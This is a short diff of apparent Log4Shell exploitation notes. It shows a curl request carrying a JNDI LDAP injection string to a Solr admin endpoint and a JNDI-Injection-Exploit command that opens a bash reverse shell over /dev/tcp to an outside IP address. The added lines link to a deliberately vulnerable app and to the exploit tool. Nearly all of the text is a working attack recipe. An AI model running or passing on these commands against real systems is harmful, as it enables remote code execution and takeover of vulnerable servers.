@@ -2,6 +2,10 @@ curl http://143.198.145.226:8983/solr/admin/cores?foo=$\{jndi:ldap://164.92.133.
 
 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C '/bin/bash -l > /dev/tcp/164.92.133.245/9999 0<&1 2>&1' -A 164.92.133.245
 
+
+REPOSITORIES:
+https://github.com/christophetd/log4shell-vulnerable-app
+https://github.com/welk1n/JNDI-Injection-Exploit
 --------------------------------------------------------------------------------------------------------------------------------------------------
 
 sudo apt update && apt install maven docker.io python3 unzip -y
